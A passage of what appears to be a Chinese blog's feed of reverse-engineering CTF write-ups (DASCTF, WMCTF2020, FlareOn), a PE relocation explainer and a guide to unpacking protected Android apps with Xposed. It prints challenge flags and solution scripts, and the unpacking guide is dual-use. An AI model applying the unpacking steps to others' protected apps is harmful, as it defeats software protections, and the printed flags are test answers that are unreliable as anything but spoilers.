    <content type="html"><![CDATA[<h1 id="DASCTF八月-RE"><a href="#DASCTF八月-RE" class="headerlink" title="DASCTF八月-RE"></a>DASCTF八月-RE</h1><h2 id="py"><a href="#py" class="headerlink" title="py"></a>py</h2><p>题目py，第一感觉就是pyc反汇编，但是题目给了一个exe文件，ida打开里面找到pyinstall，百度找了一下是pyinstxtractor解包，GitHub下载文件<a href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> pyinstxtractor.<span class="keyword">py</span> <span class="keyword">py</span>.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure><p>解出来一个包，uncompyle6反编译py.pyc文件，反汇编出来的py文件里面没有东西，找了一下发现是pyc的文件头出来问题，作者的python版本如果和你一样那么就可以顺利的反汇编，如果不一样，写入的头文件magic就会有问题</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Python</span>  MAGIC           Python  MAGIC           Python  MAGIC</span><br><span class="line"><span class="attribute">1</span>.<span class="number">0</span>     <span class="number">0</span>x<span class="number">00999902</span>      <span class="number">2</span>.<span class="number">0</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DC<span class="number">687</span>      <span class="number">3</span>.<span class="number">0</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>C<span class="number">3</span>A</span><br><span class="line"><span class="attribute">1</span>.<span class="number">1</span>     <span class="number">0</span>x<span class="number">00999903</span>      <span class="number">2</span>.<span class="number">1</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DEB<span class="number">2</span>A      <span class="number">3</span>.<span class="number">1</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>C<span class="number">4</span>E</span><br><span class="line"><span class="attribute">1</span>.<span class="number">2</span>     <span class="number">0</span>x<span class="number">00999903</span>      <span class="number">2</span>.<span class="number">2</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DED<span class="number">2</span>D      <span class="number">3</span>.<span class="number">2</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>C<span class="number">6</span>C</span><br><span class="line"><span class="attribute">1</span>.<span class="number">3</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">2</span>E<span class="number">89</span>      <span class="number">2</span>.<span class="number">3</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DF<span class="number">23</span>B      <span class="number">3</span>.<span class="number">3</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>C<span class="number">9</span>E</span><br><span class="line"><span class="attribute">1</span>.<span class="number">4</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">1704</span>      <span class="number">2</span>.<span class="number">4</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DF<span class="number">26</span>D      <span class="number">3</span>.<span class="number">4</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>CEE</span><br><span class="line"><span class="attribute">1</span>.<span class="number">5</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">4</span>E<span class="number">99</span>      <span class="number">2</span>.<span class="number">5</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DF<span class="number">2</span>B<span class="number">3</span>      <span class="number">3</span>.<span class="number">5</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>D<span class="number">16</span></span><br><span class="line"><span class="attribute">1</span>.<span class="number">6</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DC<span class="number">4</span>FC      <span class="number">2</span>.<span class="number">6</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DF<span class="number">2</span>D<span class="number">1</span>      <span class="number">3</span>.<span class="number">5</span>.<span class="number">3</span>   <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>D<span class="number">17</span></span><br><span class="line">                        <span class="attribute">2</span>.<span class="number">7</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>DF<span class="number">303</span>      <span class="number">3</span>.<span class="number">6</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>D<span class="number">33</span></span><br><span class="line">                                                <span class="attribute">3</span>.<span class="number">7</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>D<span class="number">42</span></span><br><span class="line">                                                <span class="attribute">3</span>.<span class="number">8</span>     <span class="number">0</span>x<span class="number">0</span>A<span class="number">0</span>D<span class="number">0</span>D<span class="number">55</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qfcy_/article/details/113245876">https://blog.csdn.net/qfcy_/article/details/113245876</a></p><p>这篇的作者通过添加一个新的xdis包修改magic</p><p><img src="/2021/09/04/bayue/3.PNG" alt="3"></p><p><img src="/2021/09/04/bayue/2.PNG" alt="2"></p><p>修改前后</p><p>可以之后打开py文件</p><p><img src="/2021/09/04/bayue/1.PNG" alt="1"></p><p>就是一个异或</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">  print(<span class="built_in">chr</span>((<span class="built_in">ord</span>(m[i])-<span class="number">31</span>)^<span class="number">32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DASCTF八月-RE&quot;&gt;&lt;a href=&quot;#DASCTF八月-RE&quot; class=&quot;headerlink&quot; title=&quot;DASCTF八月-RE&quot;&gt;&lt;/a&gt;DASCTF八月-RE&lt;/h1&gt;&lt;h2 id=&quot;py&quot;&gt;&lt;a href=&quot;#py&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WMCTF2020easy_re</title>
    <link href="http://example.com/2021/08/27/WMCTF2020easyre/"/>
    <id>http://example.com/2021/08/27/WMCTF2020easyre/</id>
    <published>2021-08-27T07:38:42.000Z</published>
    <updated>2021-08-27T07:51:15.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WMCTF2020-easy-re"><a href="#WMCTF2020-easy-re" class="headerlink" title="[WMCTF2020]easy_re"></a>[WMCTF2020]easy_re</h1><p>64位无壳，IDA打开并没有发现“please input the flag:”字符串，别的提示字符串也找不到，</p><p>搜一下perl，Perl 是 Practical Extraction and Report Language 的缩写，可翻译为 “实用报表提取语言”。</p><p>Perl 是高级、通用、直译式、动态的程序语言。</p><p>Perl 最初的设计者为拉里·沃尔（Larry Wall），于1987年12月18日发表。</p><p>Perl 借用了C、sed、awk、shell脚本以及很多其他编程语言的特性。</p><p>Perl 最重要的特性是Perl内部集成了正则表达式的功能，以及巨大的第三方代码库CPAN。</p><p>看了别人的博客找到了看雪一篇文章，里面程序执行过程中会用script解压你压缩的源程序</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">perl是解释语言，perlapp只是把你的perl程序压缩后放在资源里面，执行的时候会解压的。</span><br><span class="line"></span><br><span class="line"><span class="number">00405276</span>  |.  83C4 0C       |<span class="keyword">add</span>     <span class="built_in">esp</span>, 0C</span><br><span class="line"><span class="number">00405279</span>  |.  <span class="number">8945</span> F0       |<span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10</span>], <span class="built_in">eax</span></span><br><span class="line">0040527C  |.  85C0          |<span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">0040527E  |.  0F84 <span class="number">83000000</span> |<span class="keyword">je</span>      <span class="number">00405307</span></span><br><span class="line"><span class="number">00405284</span>  |.  <span class="number">68</span> 5CCF4000   |<span class="keyword">push</span>    0040CF5C                        <span class="comment">;  ASCII &quot;script&quot;</span></span><br><span class="line"><span class="number">00405289</span>  |.  <span class="number">50</span>            |<span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">0040528A  |.  8B03          |<span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>]</span><br><span class="line">0040528C  |.  FF30          |<span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]</span><br><span class="line">0040528E  |.  E8 CBEFFFFF   |<span class="keyword">call</span>    0040425E</span><br><span class="line"><span class="number">00405293</span>  |.  83C4 0C       |<span class="keyword">add</span>     <span class="built_in">esp</span>, 0C</span><br><span class="line"><span class="number">00405296</span>  |.  <span class="number">8943</span> <span class="number">24</span>       |<span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">24</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">00405299</span>  |.  85C0          |<span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">0040529B  |.  0F84 <span class="number">32020000</span> |<span class="keyword">je</span>      004054D3</span><br><span class="line">004052A1  |.  <span class="number">68</span> 50CF4000   |<span class="keyword">push</span>    0040CF50                        <span class="comment">; /s = &quot;hashline&quot;</span></span><br><span class="line">004052A6  |.  FF75 F0       |<span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10</span>]              <span class="comment">; |/s</span></span><br><span class="line">004052A9  |.  E8 <span class="number">38360000</span>   |<span class="keyword">call</span>    &lt;<span class="keyword">jmp</span>.&amp;MSVCRT<span class="number">.</span>strlen&gt;            <span class="comment">; |\strlen</span></span><br><span class="line">004052AE  |.  8BD8          |<span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="built_in">eax</span>                        <span class="comment">; |</span></span><br><span class="line">004052B0  |.  C70424 40CF40&gt;|<span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], 0040CF40       <span class="comment">; |ASCII &quot;-e#line 1 &quot;&quot;%s&quot;&quot;&quot;</span></span><br><span class="line">004052B7  |.  E8 2A360000   |<span class="keyword">call</span>    &lt;<span class="keyword">jmp</span>.&amp;MSVCRT<span class="number">.</span>strlen&gt;            <span class="comment">; \strlen</span></span><br><span class="line">004052BC  |.  <span class="number">59</span>            |<span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line">004052BD  |.  03D8          |<span class="keyword">add</span>     <span class="built_in">ebx</span>, <span class="built_in">eax</span></span><br><span class="line">004052BF  |.  <span class="number">53</span>            |<span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line">004052C0  |.  E8 46EEFFFF   |<span class="keyword">call</span>    0040410B</span><br><span class="line"></span><br><span class="line">这个地方0040528E <span class="keyword">call</span>    0040425E 就是解压的过程，直接f8过了以后<span class="built_in">eax</span>里面就是你的源代码了。</span><br><span class="line"></span><br><span class="line">对于perlapp包含lib的问题，应该在生成文件的时候添加那些附加的库，否则到别的没perl环境的系统上就啥都不显示了。 </span><br></pre></td></tr></table></figure><p>右键查找script字符串并双击进入cpu窗口</p><p><img src="/2021/08/27/WMCTF2020easyre/23.PNG" alt="23"></p><p>下个断点运行到这里，接着F8一步步下去就可以找到flag</p><p><img src="/2021/08/27/WMCTF2020easyre/22.PNG" alt="22"></p><p>看了大佬的博客看到他分析的代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;WMCTF&#123;I_WAnt_dynam1c_F1ag&#125;&quot;</span>;</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">&quot;please input the flag:&quot;</span>;</span><br><span class="line"><span class="variable">$line</span> = &lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$line</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$line</span> eq <span class="variable">$flag</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">&quot;congratulation!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">&quot;no,wrong&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逻辑就是判断一个输入字符串是否等于预先存好的flag的过程</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WMCTF2020-easy-re&quot;&gt;&lt;a href=&quot;#WMCTF2020-easy-re&quot; class=&quot;headerlink&quot; title=&quot;[WMCTF2020]easy_re&quot;&gt;&lt;/a&gt;[WMCTF2020]easy_re&lt;/h1&gt;&lt;p&gt;64位无壳，ID</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU [2019红帽杯]Snake</title>
    <link href="http://example.com/2021/08/24/snake/"/>
    <id>http://example.com/2021/08/24/snake/</id>
    <published>2021-08-24T07:00:35.000Z</published>
    <updated>2021-08-24T07:13:16.164Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019红帽杯-Snake"><a href="#2019红帽杯-Snake" class="headerlink" title="[2019红帽杯]Snake"></a>[2019红帽杯]Snake</h1><p>打开文件发现这应该是一个unity编写的游戏，打开程序，做的真的很棒，试着玩了一下发现有很多的阶段，看来不能通过玩游戏找到flag了</p><p><img src="/2021/08/24/snake/96.PNG" alt="96"></p><p>Assembly-CSharp.dll直接拖进dnspy看，通过寻找找到主函数GameObject，看上面的import发现这个函数在Interface这个dll中</p><p><img src="/2021/08/24/snake/93.PNG" alt="93"></p><p>找到Interface这个dll，进入IDA,根据字符串找到函数</p><p><img src="/2021/08/24/snake/94.PNG" alt="94"></p><p>观察输入的a1的值，发现输入进来的a1的约束条件,a1要在0到99之间，下面进行了一大段的运算，直接去逆比较困难，那只能去调用这个函数去爆破</p><p><img src="/2021/08/24/snake/95.PNG" alt="95"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baopo</span>(<span class="params">i</span>):</span></span><br><span class="line">    dll = ctypes.cdll.LoadLibrary(<span class="string">&quot;E:\\doenload\\re\\buu\\[2019红帽杯]Snake\\Snake\\Snake_Data\\Plugins\\Interface.dll&quot;</span>)<span class="comment">#进入interface.dll这个文件</span></span><br><span class="line">    print(i)</span><br><span class="line">    dll.GameObject(i)<span class="comment">#调用GameObject（）这个函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):<span class="comment">#从0~99开始爆破</span></span><br><span class="line">    baopo(i)</span><br></pre></td></tr></table></figure><p><img src="/2021/08/24/snake/91.PNG" alt="91"></p><p>这个爆破的时间有点就久，中间可能有大量的运算</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2019红帽杯-Snake&quot;&gt;&lt;a href=&quot;#2019红帽杯-Snake&quot; class=&quot;headerlink&quot; title=&quot;[2019红帽杯]Snake&quot;&gt;&lt;/a&gt;[2019红帽杯]Snake&lt;/h1&gt;&lt;p&gt;打开文件发现这应该是一个unity编写的游戏，打</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Xposed框架 反射大师</title>
    <link href="http://example.com/2021/08/20/cccccaa/"/>
    <id>http://example.com/2021/08/20/cccccaa/</id>
    <published>2021-08-20T07:39:52.000Z</published>
    <updated>2021-08-20T08:03:05.500Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="安装Xposed框架"><a href="#安装Xposed框架" class="headerlink" title="安装Xposed框架"></a>安装Xposed框架</h2><p>官网下载地址：<a href="https://repo.xposed.info/module/de.robv.android.xposed.installer">https://repo.xposed.info/module/de.robv.android.xposed.installer</a></p><p>下载之后直接拉进模拟器，安装</p><p><img src="/2021/08/20/cccccaa/1.PNG" alt="1"></p><p>一开始框架会显示没有安装Xposed，我这是已经安装好的，进入框架</p><p><img src="/2021/08/20/cccccaa/2.PNG" alt="2"></p><p>安装/更新，会请求root权限，同意即可，这样Xposed就安装好了</p><h2 id="安装反射大师"><a href="#安装反射大师" class="headerlink" title="安装反射大师"></a>安装反射大师</h2><p>反射大师是一个支持一键脱壳的神器，很好用哦！</p><p>先下载反射大师<br> 下载地址：<a href="https://pan.baidu.com/s/1ALN5n9rsfrV1lqWgaXXY2A%EF%BC%88%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Ah5nc%EF%BC%89">https://pan.baidu.com/s/1ALN5n9rsfrV1lqWgaXXY2A（提取码：h5nc）</a></p><p>下载好后直接安装</p><p><img src="/2021/08/20/cccccaa/8.PNG" alt="8"></p><p>模块没有激活，点击模块管理</p><p><img src="/2021/08/20/cccccaa/3.PNG" alt="3"></p><p>勾选选项，然后重启模拟器即可</p><h2 id="具体脱壳步骤"><a href="#具体脱壳步骤" class="headerlink" title="具体脱壳步骤"></a>具体脱壳步骤</h2><h3 id="1、用反射大师打开待脱壳的App"><a href="#1、用反射大师打开待脱壳的App" class="headerlink" title="1、用反射大师打开待脱壳的App"></a>1、用反射大师打开待脱壳的App</h3><p><img src="/2021/08/20/cccccaa/4.PNG" alt="4"></p><p>点击软件，选择这个软件，然后再打开他</p><h3 id="2、脱壳"><a href="#2、脱壳" class="headerlink" title="2、脱壳"></a>2、脱壳</h3><p><img src="/2021/08/20/cccccaa/6.PNG" alt="6"></p><p>点击屏幕中间的六芒星,选当前Activity</p><p><img src="/2021/08/20/cccccaa/7.PNG" alt="7"></p><p>写出DEX,保存即可</p><p>我们利用adb连接模拟器，adb connect ip+模拟器端口，我用的是夜神模拟器，可以在Nox\bin\BignoxVMS\nox中的nox.vbox查找，找到guestport=”5555的就是</p><p><img src="/2021/08/20/cccccaa/11.PNG" alt="11"></p><p>使用<code>adb</code>连接模拟器并使用<code>adb pull +文件路径</code>这条命令导出刚刚脱壳的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h2 id=&quot;安装Xposed框架&quot;&gt;&lt;a href=&quot;#安装Xposed框架&quot; class=&quot;headerlink&quot; title=&quot;安装Xposed框架&quot;&gt;&lt;/a&gt;安装X</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>基址重定位表</title>
    <link href="http://example.com/2021/08/16/%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/"/>
    <id>http://example.com/2021/08/16/%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/</id>
    <published>2021-08-16T08:28:09.000Z</published>
    <updated>2021-08-16T08:48:14.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基址重定位表"><a href="#基址重定位表" class="headerlink" title="基址重定位表"></a>基址重定位表</h1><h2 id="PE重定位"><a href="#PE重定位" class="headerlink" title="PE重定位"></a>PE重定位</h2><p>向进程的虚拟内存加载PE文件(EXE/DLL/SYS)时，文件会被加载到PE头的ImageBase所指的地址处。若加载的是DLL ( SYS)文件，且在ImageBase位置处已经加载了其他DLL (SYS)文件，那么PE装载器就会将其加载到其他未被占用的空间。这就涉及PE文件重定位的问题，PE重定位是指PE文件无法加载到ImageBase所指位置,而是被加载到其他地址时发生的一系列的处理行为。</p><h3 id="DLL-SYS"><a href="#DLL-SYS" class="headerlink" title="DLL/SYS"></a>DLL/SYS</h3><p>A.DLL被加载到TEST.EXE进程的10000000地址处。此后，B.DLL试图加载到相同地址(（ 10000000 )时，PE装载器将B.DLL加载到另一个尚未被占用的地址（3CO00000)处。</p><p><img src="/2021/08/16/%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/1.PNG" alt="1"></p><h3 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h3><p>创建好进程后，EXE文件会首先加载到内存，所以在EXE中无须考虑重定位的问题。但是Windows Vista之后的版本引入了ASLR安全机制，每次运行EXE文件都会被加载到随机地址，这样大大增强了系统安全性。</p><h2 id="PE重定位的基本原理："><a href="#PE重定位的基本原理：" class="headerlink" title="PE重定位的基本原理："></a>PE重定位的基本原理：</h2><p>1、在应用程序中查找硬编码的地址位置；</p><p>2、读取值后，减去ImageBase（VA转换为RVA）；</p><p>3、加上实际加载地址（RVA转换为VA）。</p><h2 id="基址重定位表："><a href="#基址重定位表：" class="headerlink" title="基址重定位表："></a>基址重定位表：</h2><p>基址重定位表位于PE头的DataDirectory数组的第六个元素（索引为5），如图：</p><p><img src="/2021/08/16/%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/2.PNG" alt="2"></p><p>其地址为0002F000，查看一下：</p><p><img src="/2021/08/16/%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/3.PNG" alt="3"></p><p>如图罗列了硬编码地址的偏移。</p><p>基址重定位表是IMAGE_BASE_RELOCATION结构体数组，其中第一个成员为VirtualAddress如地址2F000的值，第二个成员为SizeOfBlock如地址2F004的值，第三个成员为TypeOffset数组如2F008地址以下的值，以注释的形式存在，表示该结构体之下会出现WORD类型的数组，并且该数组元素的值就是硬编码在程序中的地址偏移。</p><h2 id="基址重定位表的分析方法："><a href="#基址重定位表的分析方法：" class="headerlink" title="基址重定位表的分析方法："></a>基址重定位表的分析方法：</h2><p>如上图，VirtualAddress的值为1000，SizeOfBlock的值为150，即TypeOffset数组的基准地址为RVA 1000，块的总大小为150。其中，TypeOffset值为2字节（16位）大小，由4位的Type和12位的Offset组成，比如TypeOffset数组的第一个元素值为3420，其中高4位的值“3”（IMAGE_REL_BASED_HIGHLOW）为Type，一般为PE文件，而64位的PE文件常见值为“A”，低12位是真正的位移、其值为420，下面公式计算程序中硬编码地址的偏移：</p><p>VirtualAddress + Offset = 1000 + 420 = 1420（RVA）</p><p>查看1420偏移处（程序被加载到00330000地址处、故RVA 1420即VA 00331420）是否存在要执行PE重定位操作的硬编码地址：</p><p><img src="/2021/08/16/%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/4.PNG" alt="4"></p><p>运行notepad.exe程序，假设其被加载到00330000。</p><p>1、查找程序中硬编码地址的位置：</p><p>使用PEView查看RVAV 1420处的内容：</p><p>可以看到，RVAV 1420处保存着程序硬编码地址值010010C4。</p><p>2、读取值后，减去ImageBase值（VA转换为RVA）：</p><p>010010C4 - 01000000 = 10C4</p><p>3、加上实际加载地址（RVA转换为VA）：</p><p>10C4 + 00330000 = 003310C4</p><p>可以看到，和上图硬编码地址一致。</p><p>对于程序内硬编码的地址，PE装载器都会做如上处理，然后将值覆盖到同一位置。若TypeOffset值为0，则表明一个IMAGE_BASE_RELOCATION结构体结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基址重定位表&quot;&gt;&lt;a href=&quot;#基址重定位表&quot; class=&quot;headerlink&quot; title=&quot;基址重定位表&quot;&gt;&lt;/a&gt;基址重定位表&lt;/h1&gt;&lt;h2 id=&quot;PE重定位&quot;&gt;&lt;a href=&quot;#PE重定位&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU-reverse4</title>
    <link href="http://example.com/2021/08/15/BUU-reverse3-1/"/>
    <id>http://example.com/2021/08/15/BUU-reverse3-1/</id>
    <published>2021-08-15T08:02:22.000Z</published>
    <updated>2021-08-15T08:15:44.363Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FlareOn5-Ultimate-Minesweeper"><a href="#FlareOn5-Ultimate-Minesweeper" class="headerlink" title="[FlareOn5]Ultimate Minesweeper"></a>[FlareOn5]Ultimate Minesweeper</h1><p>打开发现是一个扫雷的游戏，一点都是雷。猜测这个是.NET文件，用dnspy打开</p><p>找到主函数。</p><p><img src="/2021/08/15/BUU-reverse3-1/7.PNG" alt="7"></p><p>点进去，发现有一个<code>GetKey()</code>函数，估计这个函数就是输出flag的函数了。</p><p><img src="/2021/08/15/BUU-reverse3-1/6.PNG" alt="6"></p><p>通过函数内的调用找到判断的地方</p><p><img src="/2021/08/15/BUU-reverse3-1/hexo\source_posts\BUU-reverse3-1\5.PNG" alt="5"></p><p>通过分析代码可以知到上图中的第一个if语句是用来输出fail的（也就是踩到雷之后，游戏结束。）我们可以直接把判断的地方注释掉，踩到雷就不会结束</p><p><img src="/2021/08/15/BUU-reverse3-1/4.PNG" alt="4"></p><p>保存运行，疯狂点</p><p><img src="/2021/08/15/BUU-reverse3-1/3.PNG" alt="3"></p><p>3个8的地方记住，到原来的程序中点出来，就可以得到flag</p><p><img src="/2021/08/15/BUU-reverse3-1/8.PNG" alt="8"></p><h1 id="FlareOn1-Bob-Doge"><a href="#FlareOn1-Bob-Doge" class="headerlink" title="[FlareOn1]Bob Doge"></a>[FlareOn1]Bob Doge</h1><p>先安装一下程序，32位程序，c++写的，无壳</p><p><img src="/2021/08/15/BUU-reverse3-1/11.PNG" alt="11"></p><p>试着运行一下</p><p><img src="/2021/08/15/BUU-reverse3-1/99.PNG" alt="99"></p><p>dnspy打开,找到DECODE的地方</p><p><img src="/2021/08/15/BUU-reverse3-1/13.PNG" alt="13"></p><p>程序进行了三次运算，得到了text，text2和text3，最后回显text3。 直接在函数末尾下断 运行 截取到flag</p><p><img src="/2021/08/15/BUU-reverse3-1/12.PNG" alt="12"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;FlareOn5-Ultimate-Minesweeper&quot;&gt;&lt;a href=&quot;#FlareOn5-Ultimate-Minesweeper&quot; class=&quot;headerlink&quot; title=&quot;[FlareOn5]Ultimate Minesweeper&quot;&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>运行时压缩</title>
    <link href="http://example.com/2021/08/09/%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9/"/>
    <id>http://example.com/2021/08/09/%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9/</id>
    <published>2021-08-09T08:20:19.000Z</published>
    <updated>2021-08-09T08:30:13.504Z</updated>
    
